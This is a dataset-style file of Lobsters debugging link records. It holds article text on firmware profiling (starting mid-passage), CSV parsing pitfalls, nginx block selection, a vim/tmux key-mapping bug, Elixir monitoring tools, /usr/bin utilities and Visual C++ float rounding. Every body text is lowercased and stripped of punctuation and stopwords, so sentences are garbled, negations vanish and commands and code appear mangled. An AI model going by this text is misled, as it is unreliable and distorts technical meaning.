flowbasedprogrammingdataflow system time data programming model part input state run hour input scenario second made another plotting tool time reading flowtrace visualizing step signal processing pipeline detected note avoiding false triggering hovering hand looking change instead absolute value going range different input scenario seeing different value perform get decent confidence algorithm work actually run fast enough arduino profiling device atmel avr chip arduino leonardo processor without floating point unit bit worried exponential averaging filter using several expensive feature int division multiplication float using arduino sketch simple profiling showed worry unfounded const long beforecalculation millis state next state int next hangdrum calculatestate state input config state next const long aftercalculation millis serialprint calculating serialprintln aftercalculationbeforecalculation iteration application logic executed took m highpass lowpass le per execution since sensor readout m dominates time spent want lower latency optimization effort focused sensor readout first sensor readout around make sense optimize filtering forget hardware video testing code highpassbased practice showed yes correctly detect tapping supressing false trigger hovering palm sensor another benefit using change detection note trigger even finger currently touching hitting pad another finger absolute value thresholding second finger tap detected however also found moving sensor outside data quality increase lot case even simple absolute threshold code able correctly discriminate hovering palm higher data quality may also enable feature like velocity aftertouch putting sensor outside body give better reading requires additional manufacturing step conclusion sensorrecording together separting hardware application logic hostbased simulation form powerful tool help better understand embedded system visualizing input data internal state output firmware easily see understand condition cause problem effect changing firmware quickly understood rerunning simulation suite wide range input done second implemented easily c firmware scripting language used data analysis technique form baseline level tooling extended many way recorded highframerate video stream together input data would easier see input data corresponds physical action could annotate input data indicate correct location note expected output system write automated test output trace check well firmware detects using datadriven testing could generate test variation different input filter configuration use machine learning technique help find best value filter could also create endtoend test covering vast majority code inject input sensor data ondevice firmware serial verify produce expected midi message
465,Lobsters,debugging,Debugging,So You Want To Write Your Own CSV code?,http://tburette.github.io/blog/2014/05/25/so-you-want-to-write-your-own-CSV-code/,want write csv code,want write csv code comma inside field quote field newline inside field accepted newline character newline character change variable amount field per line empty line whitespace character separating field comma tab instead comma non displayable ascii character program reading csv use multiple delimiters non ascii data program reading csv use encoding depending locale put bom file byte order mask really still want roll code handle csv hacker news reddit,want write csv code may want write csv code field separated comma row separated newline easy right write code line hold comma inside field need enclose field quote easy right field quoted quote field need double instance quote field god forbid forget enclose field quote also make sure mistake quoted empty field double quote newline inside field course must enclose field using quote accepted newline character crlf cr lf multiple newlines newline character change eg newlines within field different newlines end line still empty field end superfluous comma variable amount field per line empty line eof single empty field field whitespace headingtrailing whitespaces field csv get always space comma part data character separating field comma kidding country use comma decimal separator instead colon country excel generate csvs semicolon separator file use tab instead comma avoid specific issue even use non displayable ascii character forget account reading arbitrary csv file indication delimiter file us program reading csv use multiple delimiters program including excel assume different delimiters reading file disk reading web make sure give right one non ascii data use right program reading csv use encoding depending locale program magically know encoding file using use encoding depending locale machine meaning save csv machine open another may silently corrupt data put bom file byte order mask determine unicode encoding used right actually used determine endianness get include bom excel interpret csv text file csv mean break within line handled really still want roll code handle csv csv well defined fileformat represent reality seems every program handle csv subtly different way please inflict another one onto world use solid library full control csv provider supplier data emit able build reliable automated system supplied csv arbitrary real way make sure data correct user check eventually specify delimiter quoting rule barring may end error worse silently corrupted data writing csv code work file real world difficult task rabbit hole go deep ruby csv library line discussion hacker news reddit
466,Lobsters,debugging,Debugging,Understanding Nginx Server and Location Block Selection Algorithms,https://www.digitalocean.com/community/tutorials/understanding-nginx-server-and-location-block-selection-algorithms,understanding nginx server location block selection algorithm,introduction nginx block configuration server location nginx decides server block handle request parsing listen directive find possible match parsing servername directive choose match first longest longest first example wwwexampleorg wwwexamplecom wwwexamplecom matching location block location block syntax none example demonstrating location block syntax nginx chooses location use handle request first post location block evaluation jump location index tryfiles rewrite errorpage conclusion,introduction nginx one popular web server world successfully handle high load many concurrent client connection easily function web server mail server reverse proxy server guide discus behindthescenes detail determine nginx process client request understanding idea help take guesswork designing server location block make request handling seem le unpredictable nginx block configuration nginx logically divide configuration meant serve different content block live hierarchical structure time client request made nginx begin process determining configuration block used handle request decision process discussing guide main block discussing server block location block server block subset nginx configuration defines virtual server used handle request defined type administrator often configure multiple server block decide block handle connection based requested domain name port ip address location block life within server block used define nginx handle request different resource uris parent server uri space subdivided whatever way administrator like using block extremely flexible model nginx decides server block handle request since nginx allows administrator define multiple server block function separate virtual web server instance need procedure determining server block used satisfy request defined system check used find best possible match main server block directive nginx concerned process listen directive servername directive parsing listen directive find possible match first nginx look ip address port request match listen directive server build list server block possibly resolve request listen directive typically defines ip address port server block respond default server block include listen directive given listen parameter nginx run normal nonroot user allows block respond request interface port default value hold much weight within server selection process listen directive set ip addressport combo lone ip address listen default port lone port listen every interface port path unix socket last option generally implication passing request different server trying determine server block send request nginx first try decide based specificity listen directive using following rule nginx translates incomplete listen directive substituting missing value default value block evaluated ip address port example translation block listen directive us value block set ip address port becomes block set port ip address becomes nginx attempt collect list server block match request specifically based ip address port mean block functionally using ip address match interface selected matching block list specific ip address case port must matched exactly one specific match server block used serve request multiple server block level specificity matching nginx begin evaluate servername directive server block important understand nginx evaluate servername directive need distinguish server block match level specificity listen directive instance examplecom hosted port request examplecom always served first block example despite servername directive second block server listen server listen servername examplecom event one server block match equal specificity next step check servername directive parsing servername directive choose match next evaluate request equally specific listen directive nginx check request host header value hold domain ip address client actually trying reach nginx attempt find best match value find looking servername directive within server block still selection candidate nginx evaluates using following formula nginx first try find server block servername match value host header request exactly found associated block used serve request multiple exact match found first one used exact match found nginx try find server block servername match using leading wildcard indicated beginning name config one found block used serve request multiple match found longest match used serve request match found using leading wildcard nginx look server block servername match using trailing wildcard indicated server name ending config one found block used serve request multiple match found longest match used serve request match found using trailing wildcard nginx evaluates server block define servername using regular expression indicated name first servername regular expression match host header used serve request regular expression match found nginx selects default server block ip address port ip addressport combo default server block used course action determined method ip addressport combo either first block configuration block contains defaultserver option part listen directive would override firstfound algorithm one defaultserver declaration per ip addressport combination example servername defined exactly match host header value server block selected process request example host header request set second server would selected server listen servername examplecom server listen servername exact match found nginx check see servername starting wildcard fit longest match beginning wildcard selected fulfill request example request host header wwwexampleorg second server block would selected server listen servername wwwexample server listen servername exampleorg server listen servername org match found starting wildcard nginx see match exists using wildcard end expression point longest match ending wildcard selected serve request instance request host header set wwwexamplecom third server block selected server listen servername server listen servername examplecom server listen servername wwwexample wildcard match found nginx move attempting match servername directive use regular expression first matching regular expression selected respond request example host header request set wwwexamplecom second server block selected satisfy request server listen servername examplecom server listen servername examplecom server listen servername examplecom none step able satisfy request request passed default server matching ip address port matching location block similar process nginx us select server block process request nginx also established algorithm deciding location block within server use handling request location block syntax cover nginx decides location block use handle request let go syntax might see location block definition location block live within server block location block used decide process request uri part request come domain name ip addressport location block generally take following form location optionalmodifier locationmatch locationmatch defines nginx check request uri existence nonexistence modifier example affect way nginx attempt match location block modifier cause associated location block interpreted follows none modifier present location interpreted prefix match mean location given matched beginning request uri determine match equal sign used block considered match request uri exactly match location given tilde modifier present location interpreted casesensitive regular expression match tilde asterisk modifier used location block interpreted caseinsensitive regular expression match carat tilde modifier present block selected best nonregular expression match regular expression matching take place example demonstrating location block syntax example prefix matching following location block may selected respond request uris look like site siteindexhtml location site demonstration exact request uri matching block always used respond request uri look like used respond request uri keep mind block selected request fulfilled using index page internal redirect take place another location actual handler request location example location interpreted casesensitive regular expression block could used handle request tortoisejpg flowerpng location jpe gpnggifico block would allow caseinsensitive matching similar shown tortoisejpg flowerpng could handled block location jpe gpnggifico finally block would prevent regular expression matching occurring determined best nonregular expression match could handle request costumesninjahtml location costume see modifier indicate location block interpreted however tell u algorithm nginx us decide location block send request go next nginx chooses location use handle request nginx chooses location used serve request similar fashion selects server block run process determines best location block given request understanding process crucial requirement able configure nginx reliably accurately keeping mind type location declaration described nginx evaluates possible location context comparing request uri location using following algorithm nginx begin checking prefixbased location match location type involving regular expression check location complete request uri first nginx look exact match location block using modifier found match request uri exactly location block immediately selected serve request exact modifier location block match found nginx move evaluating nonexact prefix discovers longest matching prefix location given request uri evaluates follows longest matching prefix location modifier nginx immediately end search select location serve request longest matching prefix location use modifier match stored nginx moment focus search shifted longest matching prefix location determined stored nginx move evaluating regular expression location case sensitive insensitive regular expression location within longest matching prefix location nginx move top list regex location check nginx try match regular expression location sequentially first regular expression location match request uri immediately selected serve request regular expression location found match request uri previously stored prefix location selected serve request important understand default nginx serve regular expression match preference prefix match however evaluates prefix location first allowing administer override tendency specifying location using modifier also important note prefix location generally select based longest specific match regular expression evaluation stopped first matching location found mean positioning within configuration vast implication regular expression location finally important understand regular expression match within longest prefix match jump line nginx evaluates regex location evaluated order regular expression match considered maxim dounin incredibly helpful nginx developer explains post portion selection algorithm location block evaluation jump location generally speaking location block selected serve request request handled entirely within context point onward selected location inherited directive determine request processed without interference sibling location block although general rule allow design location block predictable way important realize time new location search triggered certain directive within selected location exception one location block rule may implication request actually served may align expectation designing location block directive lead type internal redirect index tryfiles rewrite errorpage let go briefly index directive always lead internal redirect used handle request exact location match often used speed selection process immediately ending execution algorithm however make exact location match directory good chance request redirected different location actual processing example first location matched request uri exact order handle request index directive inherited block initiate internal redirect second block index indexhtml location exact location case really need execution stay first block come different method satisfying request directory instance could set invalid index block turn autoindex location exact index nothingwillmatch autoindex location one way preventing index switching context probably useful configuration mostly exact match directory helpful thing like rewriting request also result new location search another instance processing location may reevaluated tryfiles directive directive tell nginx check existence named set file directory last parameter uri nginx make internal redirect consider following configuration root varwwwmain location tryfiles uri urihtml uri fallbackindexhtml location fallback root varwwwanother example request made blahblah first location initially get request try find file called blahblah varwwwmain directory find one follow searching file called blahblahhtml try see directory called blahblah within varwwwmain directory failing attempt redirect fallbackindexhtml trigger another location search caught second location block serve file varwwwanotherfallbackindexhtml another directive lead location block pas rewrite directive using last parameter rewrite directive using parameter nginx search new matching location based result rewrite example modify last example include rewrite see request sometimes passed directly second location without relying tryfiles directive root varwwwmain location rewrite rewriteme last tryfiles uri urihtml uri fallbackindexhtml location fallback root varwwwanother example request rewritemehello handled initially first location block rewritten hello location searched case match first location processed tryfiles usual maybe kicking back fallbackindexhtml nothing found using tryfiles internal redirect discussed however request made rewritemefallbackhello first block match rewrite applied time resulting fallbackhello request served second location block related situation happens return directive sending status code difference case result entirely new request form externally visible redirect situation occur rewrite directive using redirect permanent flag however location search unexpected since externally visible redirects always result new request errorpage directive lead internal redirect similar created tryfiles directive used define happen certain status code encountered likely never executed tryfiles set since directive handle entire life cycle request consider example root varwwwmain location errorpage anotherwhoopshtml location another root varwww every request starting another handled first block serve file varwwwmain however file found status internal redirect anotherwhoopshtml occur leading new location search eventually land second block file served varwwwanotherwhoopshtml see understanding circumstance nginx trigger new location search help predict behavior see making request conclusion understanding way nginx process client request make job administrator much easier able know server block nginx select based client request also able tell location block selected based request uri overall knowing way nginx selects different block give ability trace context nginx apply order serve request
467,Lobsters,debugging,Debugging,My new favorite vim/tmux bug,http://www.daniellesucher.com/2014/04/24/my-new-favorite-vim-tmux-bug/,new favorite vimtmux bug,initial poking around problem happen define edge problem changed recently totally different version around time started google doc keep track everything trying wait thing magically solve tmuxconfig wheeeeee got take bug home play tmuxconfig vimbundletmuxconfigtmuxautowriteautowritevimsh line thing trying actually wow happens send alone tmux sendkeys happens hit vim outside tmux cause beepingcase toggling vim inside tmux vim outside tmux else test claim actually check keystroke encoded bash opening terminal hitting controlv hitting key encoding end exactly command vim expect toggle case character refers vim useful answer setting tmux handle xtermstyle function key input sum tmux faq vim escaped normal mode n interpreted rest literally character interpreted separate vim command part single mapping intended w ri te processrelated takeaway absence evidence evidence absence verify assumption sooner least easytocheck one great discussion post hacker news every bug existence story different software component exactly told cosmic ray bug,week grateful coworkers know come grab something seriously weird going fill much glee mean minimal repro suffolk one machine open tmux open vim open new terminal tab vim get inserted current file beep lot file already content prepends appends line sometimes capitalizes something wtf wtf wtf thank going skim detail remains blog post endless excited ramble approximately figuring nonsense went initial poking around problem happen open new bash tab window enter command bash session lililililililill look suspicious macro something hiding one vim register use reg check content vim register nope nothing fishy anything funky tmux config tmuxconf exist quick googling around turn anything standard sort tmux config file fair enough put aside moment poked around bit define edge problem happens iterm terminal happens restarting vim restarting tmux reinstalling tmux reimaging suffolk happen vimmacvim outside tmux happen handful machine checked happen vim tmux ssh another machine one exception last one coworker said able replicate ssh remote coworker machine tried replicate happen isolated datum potentially relevant highly suspect day pretty convinced folk got mixed never really happened first place happens best u fit evidence cool got lay land changed recently ah machine newly reimaged maybe new broken incompatible version thing told tmux version frozen part install script believe everything told good guessed totally different version vim tmux bash o x machine machine exhibit problem around time started google doc keep track everything trying thing start look complicated know able remember everything tried especially multiple people involved horrible waste time repeat experiment forgetfulness even worse lose potentially relevant data bore full list version reinstallation step boy detail note point downgraded bash tmux vim match version working machine problem remained point sadly told machine going get bunch stuff reinstalled spend time poking sadness okay fair enough getting people way show must go wait thing magically solve imagine delight came next morning heard reinstalling stuff fixed problem super bummed day mystery stolen away exciting hung coworker bit give pointer look elasticsearch bug ran biggest mystery week aha noticed tmuxrelated vim plugin vim config tmuxconfig bonus point anyone feel like stopping look guess story end much time play moment best thing happened able replicate machine recently reimaged new workstation setup script meant able get bug onto laptop aw yeah wheeeeee got take bug home play sat take closer look tmuxconfig plugin vimbundletmuxconfigtmuxautowriteautowritevimsh creates preexec function called whenever start new bash session enter command bash line read tmux sendkeys pane n writeall commenting line cause problem go away running tmux sendkeys n writeall manually another bash window cause bug manifest regardless perfect thing trying actually ah plugin defines relevant mapping map silent writeall silent wall cr note moment jaw dropped one look sure n supposed seem anything rest mapping set save vim buffer stuff terminal basically trying mimic way macvim set save blur sure yet toggle capitalization make damn beep capitalization vim inside tmux vim outside tmux writeall interpreted normal vim command ri replace character cursor e take end word take end line put insert mode inserted end line sure preexec function get run multiple time bash sessioncommand must happening wow around time settled perform series experiment happens send alone tmux sendkeys input output beep beep beep c file open vim content next character get case toggled huh case get toggled capitalized toggled interesting happens hit vim outside tmux aw hell macbook even key yeargh fine whatever went installed could remap fnfn test stuff result beeping case toggling cause beepingcase toggling vim inside tmux vim outside tmux super confident mapping worked properly mean tested eventviewer realistic tmux sendkeys somehow send something different mapping think sending else test claim googling around learned actually check keystroke encoded bash opening terminal hitting controlv hitting key whoa neat seems useful checked encoding see could find difference oho jumped inside tmux encoded bash outside tmux instead dunno hold look closely inside tmux encoding end exactly command vim expect toggle case character coincidence think wait second look super familiar another reason oh right noticed earlier set function key like term set set set set set set set endif eye skimmed bit earlier looked like went bother verify assumption moved right past damnit time search vim doc oh hey refers vim argh argh argh miss inside conditional always happen term well whatever term bash okay let verify inside tmux term set screen outside tmux term set oh hell googling around turned useful answer setting tmux handle xtermstyle function key input setting option fact make bug go away option set computer thing hinting different solution time search tmuxconfig plugin see come oh goddamnit set setoption g defaultterminal option set conditional autowritevim satisfied vim restarted option set vim plugins sourced secretly mapped oh oh oh oh sum tmux set handle xtermstyle function key input tmuxconf actually copied vimbundletmuxconfigtmuxautowritetmuxconf tmuxconf therefore tmux received config tmuxconf setoption g defaultterminal term inside tmux outside tmux mean tmux set handle xtermstyle function key superclear fair clear way set tmux receive xterm function key properly would g xtermkeys vim check term see function key available see tmux faq character code sent function key interpreted literally actually vim set interpret higher function key explicitly term happens explicitly tmuxconf using set verified controlv inside tmux encoded since never explicitly set otherwise term inside tmux set mean condition never met thus never set vim never mapped properly vim config preexec function ran bash sent n tmux via tmux sendkeys vim escaped normal mode n interpreted rest literally literal string mapped vim writeall character interpreted separate vim command part single mapping intended interpreted series vim command escape anything far tell toggle case next three character w take start next word ri replace character cursor te take next e take end line put insert mode inserted end line long story short fix ln vimbundletmuxconfigtmuxconf tmuxconf processrelated takeaway absence evidence evidence absence noticed pretty early tmuxconf moved figuring okay guess anything weird config next time something missing seems like likely place look want think looking whether analogous config file exist working machine compare sooner verify assumption sooner least easytocheck one noticed thing way earlier skimmed past assuming surely referred assumption would super quick verify got ta verify assumption made especially one quick easy check edit via great discussion post hacker news every bug existence story different software component exactly told unless count cosmic ray bug natch
468,Lobsters,debugging,Debugging,A tour of Elixir performance & monitoring tools,https://hackernoon.com/a-tour-of-elixir-performance-monitoring-tools-aac2df726e8c#.b2v3ch2m1,tour elixir performance monitoring tool,tour elixir performance monitoring tool nasa mission control room metric collection exometer exometer recording metric storing metric reporting metric michael schäfermeyer elixometer elixometer beam resource usage observer observer wombat wombat recon recon application monitoring appsignal app monitoring agent scout learn new relic communitydeveloped agent new relixir newrelic roman smirnov take tracing profiling recon trace recon trace tap tap erlyberly elyberly getting started guide elyberly redbug redbug redbug tutorial dbg dbg dbg exception monitoring honeybadger experience elixir,tour elixir performance monitoring toolsworking bookletai cofounded scout server monitoring acq scoutapm acq nasa mission control roomupdated appsignal exited beta scout released beta agentyou diving elixir getting close releasing first production elixir app profile monitor production tour available elixir ecosystem today note many tool erlangbased access via elixirmetric collectiongeneric metric collection sensor array app counter user signups collecting average call time critical http call etc service assist collecting aggregating metric send metric another service ex graphite influxdb datadog etc visualization alertingexometerulf wiger magnus feuer exometer defacto erlang instrumentation package several part exometer recording metric tell exometer update value exometer run function interval choosing record valuesstoring metric raw metric stored via etf beam vmreporting metric metric aggregated forwarded onto external system like graphite amnq statsdthe following story michael schäfermeyer provides great overview exometer elixometerpinterest elixometer light elixir wrapper around exometer make definingupdating metric easier plus nice timed annotation easily time function execution time timing function metric name timed function key prefixdevtimerstimedfunction timed key timedfunction def functionthatistimed othermoduleslowmethodendbeam resource usagethere several tool monitoring resource usage beam vm run elixr erlang apps beam feel like operating system versus typical vm monitoring tool sophistication matchobserverthe default goto observer likely already installed computer try launching observer via iex observer also connect remote systemwombata fullfeatured operation maintenance framework wombat commercial software available via erlang solutionsreconrecon one module erlang recon application module provides access highlevel resource usage information beam vmfor example iex reconinfo self meta registeredname memoryused memory messagequeuelen heapsize totalheapsize garbagecollection maxheapsize errorlogger true kill true size minbinvheapsize minheapsize application monitoringapplication performance monitoring apm service instrument elixir function call provide breakdown performance via transaction trace apm tool orientated around monitoring web request v general performance monitoringappsignalappsignal officiallysupported app monitoring agent elixirscoutat day job released app monitoring agent elixir learn morenew relicnew relic officially supported agent couple communitydeveloped agent available new relixirnewrelic author newrelic module roman smirnov mentioned response newrelixir trigger performance memory cpu issue triggered newrelicerlang module address issuesmy take app monitoring magical form monitoring get lot little work however making magic happen involve hook application cause crash reason lean towards service official support team dedicated keeping monitoring agent updatedtracing profilingsometimes need walk application execution framebyframe debug issue several tool provide erlang elixir appsrecon tracepart previously mentioned recon application recon trace erlang module allows safe tracing function production environmenttaptap thin elixir wrapper around recon trace providing easy elixir interface recon trace iex require tapniliex tapcall stringstrip max stringstrip test e pid stringstrip test pid e erlyberlyelyberly provides gui interface debugging profiling erlang elixir apps addition tracing elyberly collection information process memory usage elyberly meant trace production system overload protectionthe folk plataformatec great getting started guide elyberlyredbugredbug productionsafe debuggingtracing utility erlang roberto aloi great redbug tutorial blogdbgdbg erlang module tracing also thin elixir wrapper around dbg monitoringmany existing exception monitoring service already support elixir elixir erlang unique take exception important see service exception logic match needssome option take prefer service use language monitor production firsthand experience monitoring pain honeybadger experience elixir production appssubscribe get daily roundup top tech story
470,Lobsters,debugging,Debugging,Adventures in /usr/bin and the likes,https://ablagoev.github.io/linux/adventures/commands/2017/02/19/adventures-in-usr-bin.html,adventure usrbin like,adventure usrbin like introduction content misc o debugging data manipulation misc cal mkfifo netcat entry wikipedia resolveip timeout w watch o blktrace one chrt post lstopo numactl taskset numastat peekfd pidstat pwdx debugging gstack data manipulation column colrm comm csplit cut join paste replace look nl tac expand unexpand conclusion comment powered disqus,adventure usrbin likesfebruary love linux make interacting computer fun educational think someone need learn core principle underlying operating system hardware linux great place startas know interacting linux achieved mostly program command one thing differentiates linux nix based system command line concept pipe combining input output program provides powerful platform manipulating datamost linux commandsprogramsbinaries however decide call reside usrbin usrsbin bin usrlocalbin looking content directory see lot program got thinking binary meant daily work hardly use decided go treasure hunt write finding blog postas start wanted see data simple count machine usrbin give ablagoev l la usrbin wc l course everyday system lot thing running vanilla server centos installation x server little bit additional software root xxxxxx l la usrbin wc l half amount still quite lot daily work probably use around command average rough way check zsh fc li awk print sort uniq c give last command used fc see timestamps filter command todaywith data mind decided dig inside usrbin like see hidden gem present vanilla centos installation different distribution likely differencesi learned program wrote post please excuse ignorance blatantly shine throughcontentsmiscosdebuggingdata manipulationmiscatat batch read command standard input specified file executed later time using binshnice usually mess cron syntax trying setup one job one seems lot simpler kind use case example root xxxx pm warning command executed using binsh date tmptestatlog date tmptestatlog executed pm day pending job viewed root xxxx atq wed feb root appears understand cool time format example know teatime teatime cool calablagoev cal февруари нд пн вт ср чт пт сб display nifty calendar current date highlighted pretty useful ask memkfifoanother good one mkfifo used simple ipc interprocess communication creates named pipe like everything linux file mean process writing file writer process reading file reader consider following two python script usrbinpython readerpy true fp open fifo r line fpreadline print item fifo linerstrip iteration str n fpclose usrbinpython writerpy import time true fp open fifo fpwrite hello str n fpclose timesleep using script create fifo start writer start reader notice rate reader output content fifo sync writer fifo ordinary file reader constantly read file disregarding whether new item reading writing fifo blocking operation go ahead change fifo ordinary file see differenceanother great example netcat entry wikipedia mkfifo backpipe nc l backpipe nc wwwgooglecom backpipe example proxy forward request port wwwgooglecom port need fifo pipe one directionalresolveipusually get ip host use ping resolveip simpler ablagoev resolveip enwikipediaorg ip address enwikipediaorg like often need copy ip use option return ip resolveip enwikipediaorg xsel b easily made function put bashaliases file copy ip address domain usage cip domaincom function cip ip resolveip echo ip xsel b echo ip ablagoev cip enwikipediaorg timeoutrun command time limitif want edit code one pretty useful example run program second send term signal signal modified well unit duration ie minute hour day wshow logged doingon multiuser system useful root homeablagoev w ablagoev day min user load average user tty login idle jcpu pcpu ablagoev xdm upstart user ablagoev serve ablagoev gnometerminal ablagoev vim ablagoev gnometerminal watchwatch nifty tool running program periodically monitoring output simple clock n tell watch run program every second tell watch highlight difference outputosblktracethis one merit full blog post admit prepared go detail understand allows monitor io system lower level iostat measure lot io related metric good post subject seems oneonly newer kernel older one need patchedchrtwe know setting niceness process system know also alter cpu scheduling policy currently modern kernel support following policy additionally two type process real time one normal one real time process higher priority used time sensitive applicationsby changing process policy alter way linux schedule processuser process usually real time schedother policy default checked kernel process schedfifo none least machine schedrrusing chrt scheduling policy process changed queried example checking init ablagoev chrt p pid current scheduling policy schedother pid current scheduling priority consequently process policy changed follows ablagoev chrt b p pid ablagoev chrt p pid pid current scheduling policy schedbatch pid current scheduling priority could find practical use case though whether worth meddle policy production post go depth benchmark love someone share experience knowledge regarding policiesmore detailed reading lstopothis one cool used display hardware layout machine topology support lot different output format well ascii art awesome example root lstopo txt machine socket p pci pci pci core p core p core p core p pci pu p pu p pu p pu p sda sdb pu p pu p pu p pu p host index physical date сб cet command part hwloc packagenumactl tasksetit appears candidate separate blog post far understand command used control process thread cpu affinity ie assign different process thread different core socket additionally also control memory node numa pool processthread use practically used linux scheduler optimal job place thread similar process across core order start review numa architecture root chat numactl h available node node cpu node size mb node free mb node cpu node size mb node free mb node distance node server two cpu socket core total memory divided two nodesa simple example numactl numactl program run program first cpu socket change process affinity run time use taskset taskset work core socket want assign process single socket list core using c assigning pid core core viewed cat proccpuinfoadditionally view current cpu core process look psr column p ablagoev p pid psr comm p pid psr command init mean init process currently core pernumanode memory statistic process operating system root chat numastat numahit numamiss numaforeign interleavehit localnode othernode seems logical lot miss miss memory allocation node preferred process non optimal affinity somewhere systempeekfdthis one used monitor io given process continuing though quote man page bug probably lot surprised process monitoring diesi careful using production perhaps someone chime regarding stability case monitoring vim activity save root homeablagoev peekfd writing fd k w writing fd example io writing fd noeol written writing fd x u cool thing actually see written file course also achieved strace filtering outputpidstatthis one used monitor various statistic given process whole system give information similar tophtop capable providing detail example root chat pidstat p linux cpu pid usr system guest cpu cpu command node node node node node node node end tell pidstat poll statistic every second watch io statistic using option root chat pidstat p linux chat cpu pid kbrds kbwrs kbccwrs command node node node node node memory root chat pidstat r p linux chat cpu pid minflts majflts vsz r mem command node node node node node node task context switching root chat pidstat w p linux chat cpu pid cswchs nvcswchs command node node node node pwdxa simple useful tool get working directory process ablagoev pwdx homeablagoevworkspaceablagoevgithubio one bit tricky use merit another full blog post know folk dealing lower level programming probably using daily basis range different case though one useful debugging segfaultssegfaults usually following form phpfpm segfault ip sp error xcacheso case segfault appearing shared library xcacheso need calculate correct address subtracting library offset xcacheso instruction pointer ip part address feed along location shared object e particular machine output offending line c source code generates segfault awesome like said though one need full blog post lot example work binary need compiled debug symbol otherwise able get needed information also theory behind address calculation interesting reading todo list additionally tool allow debugging gdb gstackprint stack trace running awesome able see stacktrace rogue process definitely help tracking problem usage pretty straightforward command wrapper around gdb thus distribution missing achieve gdbdata manipulationcolumnthis one awesome believe know used format input column useful application would format csv file among stuff specify delimiter different column imagine following file id event count test using following command ablagoev column test id event count test get interesting combination next commandcolrmthis one used remove column input used using awk colrm seems easier simpler use case result command could remove first column ablagoev column test colrm event count test commcompare two sorted file line linewith comm compare two file see item line first second file whether line present file consider following two file common line file file common line file file running comm give following output ablagoev comm common line file file file output separated column first column contains line first file second column contains line second file third column contains line present file one thing consider file sorted alphabetically finally option control column displaycsplitsimilarly split know definitely check csplit used split big file smaller chunk unlike split though csplit used regular expression section different size consider example file datatxt item shoe price quantity item dress price quantity item sock price quantity using following command csplit suppressmatched datatxt get file containing item block suppressmatched option tell csplit exclude matching line output tell csplit repeat matching pattern many time possible unfortunately csplit operates line line ie multiline regular expression workcutcut considered popular never got round checking look powerful tool similarly colrm cut used extract portion column file unlike colrm though specify delimiters startend offset make command powerful parsing csv file example consider data datatxt id name count shoe dress sock using cut give ablagoev cut datatxt id option specifies delimiter case f option specifies column output wanted column ablagoev cut datatxt id count option make command even flexible one worthy mention control output delimiter ie ablagoev cut outputdelimiter datatxt id count tell cut use tab characterjointhis one also popular unknown go allows joining data two file based common field consider two file date count date sum using join get ablagoev join date count sum joined file based first column command provides flexibility choose column use file delimiter use default whitespace pastepaste used merge file together simplest case file used join line file given file data running ablagoev paste data option specifies delimiter used join line file bit confused description option work without single file paste one file time instead parallelmaybe without file processed line lineanother use case join two file consider following name shoe skirs sock dress ablagoev paste name quantity shoe skirs sock dress course delimiter also specified first examplereplacei wish knew earlier memorize sed syntax simple search replace operation one used replace string file example given file data variable operation variable print variable running replace change variable x ablagoev replace variable x data data converted ablagoev cat data x operation x print x quick easy multiple search replace pair used well multiple fileslookthis one little gem filter line beginning specified string essentially grep prefix without regular expression given file data pref thing pref another thing pref ablagoev look pref data pref pref pref one interesting use case described man page use look spellchecking apparently english dictionary usrsharedictwords default look us input ablagoev look defini defining definite definitely definiteness definiteness definition definition definition definitive definitively nla handy small tool add line number file given file data first line second line third line running nl ablagoev nl data first line second line third line tacjust like cat print file reverse order ablagoev cat data ablagoev tac data expandthis one simple seems handy convert tab spacesunexpandreverse convert space tabsconclusionand learned lot stuff writing blog post love appreciation linux grown amazing kind transparency detail system provides gem would like share please comment section command new probably made lot factual error appreciate feedback correctionsplease enable javascript view comment powered disqus
471,Lobsters,debugging,Debugging,Incorrectly Rounded Conversions in Visual C++,http://www.exploringbinary.com/incorrectly-rounded-conversions-in-visual-c-plus-plus/,incorrectly rounded conversion visual c,decimal floatingpoint conversion analysis david gay strtod function decimal binary converter halfway case example incorrect binary scientific notation example incorrect dyadic fraction discussion greater halfway case example incorrect example correct correctly example incorrect example correct correctly example incorrect discussion bug report incorrectly rounded decimal binary conversion visual c update david gay strtod function dtoac,analysis decimal floatingpoint conversion noted example converted incorrectly microsoft visual c compiler found example including class example convert incorrectly analyze example article analysis analysis using visual c express edition version converted decimal number doubleprecision floatingpoint via strtod library function floatingpoint literal converted implicitly compiler discovered example incorrect conversion three way random testing using strtod could automated easily trial error direct construction random testing extensive exhaustive generated random decimal string positive number scientific notation random number digit random exponent compared visual c conversion given david gay strtod function de facto standard correct conversion routine found conversion done incorrectly three hundredth percent time conversion incorrect one unit last place ulp incorrect conversion included hard easy case defined incorrect conversion verified hand either halfway greater halfway case defined example used c function inspect converted floatingpoint value verified strtod compiler converted decimal number doubleprecision floatingpoint value also verified correctly converted value hand using fullprecision binary number generated decimal binary converter halfway case halfway case decimal number convert fullprecision binary number halfway two binary floatingpoint value convention correct rounding tie broken choosing floatingpoint value least significant bit equal term doubleprecision floatingpoint normalized number halfway case happens significant bit fullprecision binary number equal bit beyond equal bit equal fullprecision binary number rounded bit bit equal fullprecision binary number rounded bit either case correctly rounded result significant bit testing show visual c consistently round halfway case incorrectly specifically always round even bit fullprecision binary number equal example incorrect integer convert binary number bit bit beyond halfway case bit correctly rounded value binary scientific notation x visual c computes converted value x one ulp correctly rounded value example incorrect dyadic fraction equal convert binary number significant bit bit equal correctly rounded value x visual c computes converted value x one ulp correctly rounded value discussion example would considered easy case correct rounding parlance require one extra bit beyond double precision make correct rounding decision example support assertion visual c universally adopts truncation halfway case greater halfway case greater halfway case occurs decimal number convert fullprecision binary number two binary floatingpoint value closer one visual c get wrong right example incorrect integer convert binary number bit bit beyond bit correctly rounded value x visual c computes converted value x one ulp correctly rounded value example correct integer convert binary number like prior example bit bit beyond visual c convert correctly x example incorrect dyadic fraction equal convert binary number convert correctly x visual c convert one ulp correctly rounded value x example correct dyadic fraction equal convert binary number visual c convert correctly x example incorrect decimal fraction nonterminating binary dyadic relevant portion first place significant bit significant bit round correctly x visual c computes value one ulp x discussion visual c get example correct even though appears harder example convert incorrectly example six zero beyond bit example dyadic fraction theoretically easy convert example digit long example digit long dyadic fraction number bit decimal digit example convert correctly example visual c stop looking beyond place example hard case visual c get wrong bug report april submitted bug report microsoft titled incorrectly rounded decimal binary conversion visual c microsoft closed bug said would reconsider sic future version vc see update bug report deleted could argue one ulp away correct result inconsequential technically think legal perspective ieee floatingpoint specification seems conventional wisdom find exact wording spec someone enlighten however widely used open source code david gay strtod function dtoac get conversion right visual c would imagine problem also affect rest visual studio investigated
